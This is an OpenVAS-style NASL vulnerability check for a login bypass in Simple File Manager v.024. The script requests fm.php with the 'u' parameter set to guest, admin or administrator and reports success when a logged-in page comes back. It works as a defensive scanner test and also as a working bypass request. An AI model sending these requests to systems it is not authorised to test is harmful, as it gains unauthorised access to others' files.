if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803666" );
	script_version( "2020-10-20T15:03:35+0000" );
	script_bugtraq_id( 60579 );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-10-20 15:03:35 +0000 (Tue, 20 Oct 2020)" );
	script_tag( name: "creation_date", value: "2013-06-19 13:47:05 +0530 (Wed, 19 Jun 2013)" );
	script_name( "Simple File Manager Login Bypass Vulnerability" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/85008" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/26246" );
	script_xref( name: "URL", value: "http://cxsecurity.com/issue/WLB-2013060142" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/php/simple-file-manager-v024-login-bypass-vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation allows attackers to bypass security restrictions and
  gain unauthorized access, other attacks may also be possible." );
	script_tag( name: "affected", value: "Simple File Manager version v.024, other versions may also be affected." );
	script_tag( name: "insight", value: "The flaw is due improper verification of access permissions by the fm.php
  script, via 'u' parameter." );
	script_tag( name: "solution", value: "Upgrade to Simple File Manager version v.025 or later." );
	script_tag( name: "summary", value: "This host is running simple file manager and is prone to login
  bypass vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", "/sfm", "/filemanager", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	sndReq = http_get( item: NASLString( dir, "/fm.php" ), port: port );
	rcvRes = http_keepalive_send_recv( port: port, data: sndReq, bodyonly: TRUE );
	if(ContainsString( rcvRes, ">Simple File Manager" )){
		for user in make_list( "guest",
			 "admin",
			 "administrator" ) {
			req = http_get( item: NASLString( dir, "/fm.php?u=", user ), port: port );
			res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
			if(ContainsString( res, "Home" ) && ContainsString( res, "logout" )){
				security_message( port: port );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

